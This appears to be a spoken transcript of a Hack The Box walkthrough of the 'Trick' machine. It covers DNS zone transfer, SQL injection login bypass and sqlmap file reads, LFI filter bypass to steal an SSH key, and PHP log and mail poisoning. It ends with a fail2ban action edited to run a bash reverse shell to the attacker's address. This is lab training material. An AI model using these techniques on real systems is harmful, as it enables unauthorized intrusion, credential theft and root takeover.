 what's going on YouTube this is ipsack me doing trick from hack the box which revolves around three main tricks I think and two of those tricks you can use your own trick to get around the trick so there's a bit of trick exception going on and I know that sounds confusing but the first step is just doing a simple DNS Zone transfer which gets you one domain there's no way to really get around this so that domain is the pre-prod dash marketing domain now the intended way is to use a SQL injection in that to leak the nginx configuration file that gives you the pre-prod dash marketing domain however if you notice pre-prod Dash is in the domain you can set up your F to fuzz that and just get the marketing domain without SQL injections so that's one of the tricks to get around a trick the other part of this box is doing a lfi and the intended way is to use the SMTP service to write a file to the box that ellify that file but you can access the nginx access logs or just read the SSH key of Michael and skip that whole state step um the root is abusing a IP tables misconfiguration but we'll get into that in a minute so let's just jump in as always we start with the end map so Dash SC for default scripts as V enumerate versions OA I'll put all formats putting the nmap director and call it trick and then the IP address which is 10 10 11.166. this can take some time to run so I've already ran it looking at the results we have four ports open the first one being SSH on Port 22 its Banner tells us it's a Debian box then we have SMTP on Port 25. it's Banner tells it it's postfix smtpd which is an odd one I don't really have any general like enumeration I do when I see this so I'm just going to skip until I hit a roadblock and then we can try SMTP again then we have DNS on Port 53 its Banner tells us it's a Debian box and this is an oddity um generally when we see DNS it means it's going to be an active directory box but this one is on Linux and I think the default configuration for DNS on Linux is to only listen on 53 UDP the one piece of DNS that does require TCP is a Zone transfer so we should poke around at this just a little bit um then the final Port we have is HTTP on Port 80 and it's running engine X but because I only know of one thing to really do with DNS Recon that's where I'm going to start if I started on the web server um there's a lot of things we can do with web right I mean pretty much my whole channel has boxes exploiting a web not too many on DNS because not much we can do I'm going to start off with just nslookup and then server 10 10 11 166 and then we're going to tell the DNS server to query itself so we see it is trick.htb I'm also going to give it 127001 just to see what it says that time it says localhost so we can exit this go into our host file and put 10 10 11 166 trick.htb now if we didn't want to use nslookup we could have used dig um I want to say it's Dash X to do a reverse lookup and dig it is we see that right here so if I do dig Dash X or actually we should do at this is going to be at the server so 10 10 11 166 Dash X then 10 10 11 166. and we get a bunch of output but we do see trick.htb here and then if you wanted to script this or something dig does have a plus short command and chances are that's going to be the information you want so we see it right there um since we know trick.htb I'm going to do a axfr which is a Zone transfer I have no idea why you need all these flags for a Zone transfer that's just what it is and then you give it the top level domain which is trick.hdb and we can see there is a c name a pre-pod a pre-prod dash payroll.trick.htb so let's add this there's pseudo VI Etsy host and we can add this domain name and if we wanted to again the plus short command does work if you just wanted to get a list of hosts and hardly enough let's not get the pre-prod so it didn't get the z names with Dash short I'm not sure why um another tool worth mentioning is DNS Recon it is a python script and this would have let us do like um ranges of ips if you want to do reverse lookup so if I do 10 10 11 uh zero to 254. it's going to do we need a domain let's just give it a blank domain I thought it was going to do it maybe 10 10 11 1 to 254. let's do SATA notation oh we have to give it a name server um let's see man DNS Recon of course we do dash n so 10 10 11 166 is going to be the name server and it's just going to do a pretty much brute force between 10 10 11 0 and 10 10 11 255 and we get this um this DNS Recon thing I generally do this like on a domain controller or something but be careful because if they're monitoring DNS request brute forcing a bunch of reverse lookups is going to be suspicious so um with that being said let's go take a look at the website so if I go to 10 10 11 166 then I go to trick.htb and then let's cap my host file so I can get the other domain that we found the pre-prodesk payroll and this one gives us login.php this is coming soon this is coming soon so these look like the same exact page if I control you this it just looks like a contact form I don't believe there's anything here we could try doing exploits like SQL injection on the email address but I'm going to skip that we could also like go Buster this domain but let's try this let's do admin admin to try to log in I'm going to try basic SQL injection or one equals one with the comment and we get in to this admin panel this is the retire management system I'm just going to click around look at functionality see what we have a deduction list I wonder if we put a single Court there does that error this looks very much like the video I did just last week and I'm guessing this aired because it's just hung um with like a some type of school form right I haven't actually played with this yet so let me just check real quick burp sweet edit let's save this form if I hit send yep it's one if I put a comment here it's going to be aired out so this is probably going to be on like Source codester.com if you want me to see me exploit this whole update statement which looks like it is I would recommend looking at the faculty video I'm not going to do that two videos in a row but this looks very similar um we do have potentially lfi up here right it says page deductions so I wonder if we can do any type of lfi with this parameter let's send this over to burpsweet um let's see drop this go here so we do deductions and we get 14 4 bytes so what I'm going to try is a PHP filter so filter then um I'm actually drawing a blank on that PHP filter convert base64 turn rip Suite off Google convert Dot let's see where is it convert dot like this filter Basics D4 encode resource is deduction I want to say nine five bites but I don't see any base64 here if I just go here it's deductions we can try that 15K bytes this looks promising and we do have an lfi now the issue with this lfi is it's probably a pending dot PHP to everything um I'm just going to copy this V deductions.php.b64. base64--d on this file and yeah nothing special so I'm going to try index.php and we get 9500 bytes which doesn't have anything so if I do index we do have the index to this so I'm gonna guess there's nothing too special here um there's probably going to be database credentials we can grab through this so maybe that's what I should do and this is going way off the intended path um so I have not done this before we want to include auth.php probably so let's try index equals auth go to the bottom where's base64. nothing there so I guess that's not there login.php 13 000 bytes that looks promising the login.php.b64 paste look at this session start we got this DB connect.php so let's get the database credentials grab this foreign because this is so short base64 decode and we get a potential password truly impossible password and username Remo so let's just do V credits.txt Remo this now we don't really have credentials I guess we could try Remo 10 10 11 166 to log in but we can't get the um what is it the drawing a blank the pass WD file because it's always a pending dot PHP to a request and because it's doing that we can't really grab much um I guess we could try like a comment but I'm 99 sure this doesn't work 9 500 bytes put another slash 9 500 bytes um yeah I don't think there's anything we can append to this we'd have to be able to like upload files and do a zip filter like we did on Crime Stoppers but right now all we can do is extract PHP files which doesn't really help us so one of the things we could do is go back to the login panel of this website so I'm going to log out I guess we could have looked for a file upload vulnerability but let's just go back to this login injection so if I do burp Suite let's do admin admin intercept this request login copy this to a file or is it there it is and we're going to htb trick I'm going to call this login.request and we can do SQL map Dash R login dot request and let's see if it finds exactly how this is injectable and if SQL map can extract any type of data from this um I guess we could have done dbms as equal to mySQL because we got the um login file for that and we're able to validate it is my sequel but SQL map told us and we can just keep going it's going to test some Union injection that's probably going to do um Boolean error whatever um I should have did dash dash batch so it just shows all the default values for this but I'm going to let SQL map do its thing and then we'll resume once it's done SQL map is now done and it found it was time based blind injectable which is going to be slow we're going to fix this up in a little bit but I want to show how slow it is the first thing I always run with SQL map is the Privileges and this is just going to tell me what type of privilege I have on the database I don't think this one's going to take too long because it should just be like bullying stuff it gets maybe I'm not exactly sure but you can see this is certainly not instant right because everything it does it's injecting a time and it has to like wait two seconds per request for it to work and it also doesn't like threading so you can see how slow this is extracting data one character at a time so what I'm going to do is fix this up so let's control C out of this and instead of privileges I'm gonna do um I think it's risk three level five and I may get these reversed it may be risk five level three um this is just the max of them right so I'm gonna hit enter um it looks like it's still saying time-based blind so I'm going to change the technique so if I do technique is equal to and I'm going to do b e and u and then hit enter okay it looks like it's going I'm just going to quit so we can do dash dash batch and while that runs I can do man SQL map I can show you what technique is um there are a bunch of options for it this is B for Boolean error Union stacked generally I only see stacked on like Microsoft SQL maybe it's like postgres as well but my sequel generally doesn't support stacked queries that's when you just run a query terminate with a semicolon and then run another query that's a stacked query then T this is going to be the timing this is going to be super slow that's why we did not put that there we only put be you we know it's vulnerable timing we don't care and then Q this is going to be an inline query um I'm not exactly sure what this is I want to say it's an oracle thing and it's like an inner join maybe I'm not sure exactly what inline queries are but be you are the main ones we want so that's why I ran it with that and we see it's doing a bunch more unions it found a bullion based blind and error based so that is good now let's just do uh the privilege command again one of his privileges nope just that and we are already finished and we got the final privilege it is that much faster with this right because it doesn't have to wait after every request like before sending one request winning a second to see um if it was true or false and then go into the next one this one just gets it instantly because it determines based upon what the request does and because it's not time based you're not worried about overloading the system so you can do it in Threads so you can do like 10 queries at once so it is quite literally a hundred times faster but we can do a file read because we have the file privilege on this and now we can just read files off the file system so I can get like Etsy password and we see it is extracting it and it's casting it all to hex um just because that's a friendlier format for like automated tools and we see it has saved Etsy password to this directory so I can just do a less on it and what we could do is grep for anything that ends in sh on this and we got Michael as a user so what I'm going to try is sshing as Michael with this password so sh Michael at 10 10 11 166. try to log in and we don't get any success the other thing we could do is um figure out other files we can read so I'm going to try Etsy engine X um sites Dash enable default I want to say this is the default location for engine X looks like it is and I did nginx because if you go back to the nmap that's what um was running I didn't bother with extracting the source code because we already looked at this Rose code with the lfi so let's list this file and we can see how it's configured so we got trick.htb going to VAR dub dub dub HTML then we got pre-prod marketing going to verb dub dub dub Market and we got prepod payroll going to Vera www payroll uh we've been playing with the payroll thing so this is a new sub domain we have so let us add this to a host file so sudo VI Etsy host and we can add pre-prod marketing to this and try it out so I'm going to copy paste and we can go to marketing.trick.hdb and undo prep Suite and we have just a generic web page so I'm going to click around we see the same thing we saw before of it doing page equals so let us try the lfi trick here and see if anything's better um the thing I'm liking about this is we see the extension with the lfi before um I guess I don't have it up but it was a pending.php it just said is equal to the file name and the server was adding dot PHP to the end this time it's not appending the extension so we can control this right um so the very first thing I'm going to do is the filter check again and the reason why I'm doing the filter trick is it tells me if I'm at the start or um start of the include so that was my main goal with doing this so we do this we get nothing and what this means generally if it is truly vulnerable to file inclusion is there's going to be directories ahead of it right so this will be where where user input is um it's just got a directory there because if it hard cares the directory and a user input comes here with PHP colon it's not going to work the PHP filter has to be at the beginning of the include statement um not that that matters too much because we can test for this by doing like dot dot slashes and then Etsy pass WD and we still get nothing now we could try services.html we get something here which is a bit odd if I get rid of this we still have it um I'm going to try this which is going to look funny and we don't get anything and this does tell me something um it's going to be how the filter is set up it's not going to be recursive which we're talking about in a second but we can get Etsy pass WD so let's just get this source code right this index.php so we can see exactly how it's coded so I'm going to go back to this SQL map and where is it right here and it was verb dub dub dub this is marketing and then index.php is it Market not marketing there we go so now we have the source code to this and we can examine exactly what is going on so we got the file that's going to be the user input and if there's nothing set it's going to include home.html if file is set it's going to do this and we see it's hard-coded market so this is why the PHP filter did not work and then we'd have a sto replace on dot dot slash and it's doing nothing but what I said about it not being recursive so it starts out with this string actually better way we can do this let's just exit uh is it PHP Dash I PHP X PHP nope um Interactive Dash a I think not what I would have guessed okay so let's do a is equal to dot dots lashes skip sec and then we can Echo SDR replace dot dot slash with nothing um how did this let's look at index real quick uh SDR replace so there's three parameters for some reason in my head I was thinking two but there's three so we got this and then we can do a like that we have to do a semicolon there and we see it just says ipsec because it replaced dot dot slashes so all we're doing is adding a dot dot slash so when it erases this one it creates another one so if I do this we Echo SDR replace you can see it left one that's what I mean about it being recursive when it runs this it doesn't check the string for dot dot slash again and do it again so that's why we can get the Etsy pass WD so what I'm going to try next is check my environment variable so proc self and buy-in and we get nothing and generally when I get nothing I'm going to add the range header so range header HTTP I want to say it's like range 0 to 255 bytes um sometimes when going into these um proc directories you need the range header so this is my first thing range colon unit start so bytes let's just do this add this in and we don't have envion let's try CMD line and we do have this running as Michael so the web server itself is running as Michael which means we can probably access Michael's home directory so Michael SSH idrsa helps if I spell SSH and we get logged in so let's do VI Michael dot key and chmod 600 michael.key sh-i Michael Rocky and I misspelled that but oh well Michael at 10 10 11 166. and we get logged in and there's a few other ways we could do this lfi which I'll come back at the end uh the first one is poisoning the engine X log because actually let's just do it real quick this won't take too long so verlog nginx access.log we can see we have complete access over this log or at least we can read it and here is all our lfis so if we put a PHP payload in our user agent it will execute right so if I do this and the key thing here is you have to be very careful when you do this because if you put a um error in this it'll just like the PHP gets to this um hits an error crashes PHP and you will no longer be able to exploit it this way so always be careful here and now watch as I said that I'm going to screw it up so we're doing echo system like this PHP system get CMD I want to say this is good and now we can say and CMD is equal to let's just do ID and then go to the very bottom and we have the output of the ID command right here so now we could do a reverse shell right here and get a shell as Michael without that right and the final thing we could do is abuse the SMTP to send mail to Michael and then read it that way so let's go here uh open new Pane and then we're going to do nctrick.hdb on Port 25. and we can say hello trick.hdb the domain um let's do Dash V so it tells us we're connected okay hello trick.htb is it like this um let's just keep sending it I expected the server to tell us something there we go it started saying as we said mail from so I did mail from and then ipsec at trick.hdb we say rcpt for recept a recipient or recipient to Michael trick.hdb uh relay access denied so we don't have permission to send to that address um let's just do Michael okay so that one works so it's not configured in a normal like mail like we think of email it's just configured locally so that's why you could email a local user and then we can say data and this is going to begin our email we can say subject uh please subscribe to ipsec and then we can put our PHP this is going to be the data portion of it so system get CMD like this and then we end with a period to send the mail and it's queued so I think that means it's sent so let's try Pages equal to this then let's go back here verse Paul male Michael CMD is equal to ID and that didn't work but I just realized this needs to be and and there we go we have the output of ID so we can put a reverse shell here and also um get a shell so that being said let's just start where we have SSH because we use the key to log into this box and the first thing I generally do when I get to my box is check sudo and it looks like we can restart fail to ban as the root user so I'm going to do sudo Etsy init.d failed a ban restart and it restarts so what this says is we can edit the fail-to-band configuration so the next thing is what files do I specifically have access to so I'm going to do find Dash and then Dash user Michael pipe error messages to devnoll and then we'll I'll put it to less and I'm going to hit the Ampersand and the exclamation point to do a non-match and I'm going to hide everything with VAR dub dub dub and then let's hide everything from home uh we don't want Brock and every time I'm just saying the Ampersand exclamation point uh we can get rid of CIS and there's literally nothing else so there's no interesting files that Michael has ownership to if I check the groups I am in the security group so we can do the same exact thing except Dash Group Security and we see I'm in this one specific uh folder if I do Dash LS it'll show me that the security user has read write execute over fail to ban actions.d so if I go into this directory and we do an LS this is going to be all the actions that failed a band can do for instance if we look at iptables.com we can see this is how it loads iptables commands so we can change this band action potentially to execute a shell so instead of like IP tables let's just do oh read only file can I not write this iptables.com uh we can read it so maybe move it dot back and we can do this because we have ownership over the folder so now I can do iptables.com so let's copy the back over top of this and now that we have um copied it we are the owners of this right so iptables conf Michael owns it back root owns it and again we can move that because um we had rwx on this directory so let's go iptables.com and edit this file for the action ban see there we go so the option action ban let us change this to Dev shm shell.sh write it uh what I guess there was a crime that cleaned up this directory as I was working that's my only lot uh clue to what happened there so that's what I'm guessing so let's real quick create Dev shm shell.sh Ben Bash Bash I Dev TCP 10 10 14. eight nine thousand one zero and one CH mod plus X on that file NC lvnp 9001 let's just test this out bash Dash I Dev TCP this is why testing is always crucial there we go this looks better so now let's do this [Music] um let's move iptables.com to iptables.com CPA Viet and then we can change the band action to Dev shm shell.sh okay nclvnp 9001 and then SSH to 10 10 11 116. and let's just our 10th 166 as tricks and let's just get banned so fail to band will probably work if we have multiple failed password attempts I would think maybe it has to be a valid user Michael try this oh um we need to restart the service and I think I'm banned nope so let's do sudo fail to band restart back to make sure that file still existed so let's see do we ever get banned it's not looking like we do so the next thing I'm going to try um there's other IP tables ones I'm guessing I'm banned right now because nothing's working real quick like you can hear me hitting enter there we go my session is back I do lsla and nothing's in here so I did get banned I think and I think something reverted it um I'm gonna try a different IP tables I'm gonna try like iptables multi-port and if this doesn't work I'm going to look at the logs to see exactly um what's happening so we can remove iptables multiport.com and then CP this over top and then let's try this one action ban Dev shm shell.sh okay restart it so all I'm doing here is a watch command so I can see if this time ever stops because if that time stops then I know um my ss8 session is dead so one failure two failures generally it's three to five failures for failed a ban um the odd thing is it's not asking us for multiple attempts on the password but there we go so it looks like it was four attempts and then executed and now we are root at trick so um that'll be the Box apologies for the sloppy cut when editing this video I realized there were two things I probably should show because they were super interesting to me the first one is kind of skipping the whole SQL injection part so if you remember we found this pre-prod Dash payroll domain through a DNS Zone transfer and the next step is trying to find the um pre-prod Dash marketing domain and we found that through SQL injection here where we read the engine X configuration file and saw the virtual host there but if we just noticed hey this website uses pre-prod Dash something we could have fuzzed this right so let's go into Pho so fuzz faster you fool oh we're gonna do Dash U then HTTP 10 10 11 166 which is the IP address of trick we're going to use the word list opt seclist Discovery DNS um sub domains top let's just do 5000 because we want this to go quick and marketing is a pretty common word um and then the last piece we want to do is a header so I'm going to do Dash H and then we're going to put host colon and then pre-prod Dash fuzz Dot trick.htb and this host header is how the virtual host works so this is how we tell the website what website we want to go to I'm just going to get hit enter and we can see everything responds with the size of 54.80 or I guess almost everything so I'm going to filter that out so Dash FS to filter size and then 5480 and we see pretty much right off the bat marketing is here because when we hit pre-prod Dash marketing it returns a different website so this is another way you could have found the subdomain and it's a really tricky way that I do love showing so that's one um the second thing I wanted to dig kind of into is if you remember doing like this [Music] um what was it lfi we were trying to get the Environ file right and we couldn't we tried going and um getting the range so if we go to this page we tried putting this and it didn't work so if we copy this put it in still doesn't work um and I was kind of curious why it doesn't work and I it still am so let's figure this out so I'm going to SSH into the box with the creds we have um we extracted this SSH key through the lfi itself but now we're in this um I'm going to look at the type of box this is so let's see Etsy OSB release uh let's do you name Dash a this is Debian so does Debian have a environment file that's my first kind of guess so now that I'm on the box I can see it indeed does have environment so why can't I access this I'm going to go into my proc self directory and then look at these files see if one stands out uh stat stands out and I think stat is telling me my current PID um OS grep 2904 let's see oh it's probably because it's telling me the PID of my cat command so Maybe ps-e-f rep 2904 okay so no okay I did LS so we can see this is the PID um so PID of the active process then this is going to be the parent probably but we can kind of understand how stat works and that's going to be beneficial because we can now get the PID of this web server I'm going to hit it a few times just to make sure it's not changing we see it is 748 so let's go up one directory and go to uh proc 748 you do it osla and oh we see everything's owned by root so I'm guessing this is engine X starting as root then changing the owner to Michael and if I grip this for Environ um we can see only root has read access to this file so that's why we can't read it if I look at stat stat is or readable so that's why we could pull this file but we couldn't pull the environment so um if we do PS Dash EF grep on 748 we can see um F4 Michael I'm guessing its owner is actually root that's why it's a question mark here but when we execute a shell it's definitely executing as Michael right this is not a web server running as root um if it is then we'd just be able to do root root dot text yeah that's not the case so um it's definitely running as Michael I'm guessing the lfi opens a new process or something I'm not sure what's going on there but engine X is downgrading the permissions and that's why everything's owned by root um except task whatever is in task is owned by Michael but yeah there's oh still owned I was like wait what this looks like the same exact directory um yeah so the proc is very confusing but if you're curious why we couldn't read an environment it's because we didn't have permission to so with that being said I hope you guys enjoyed this video take care and I will see you all next time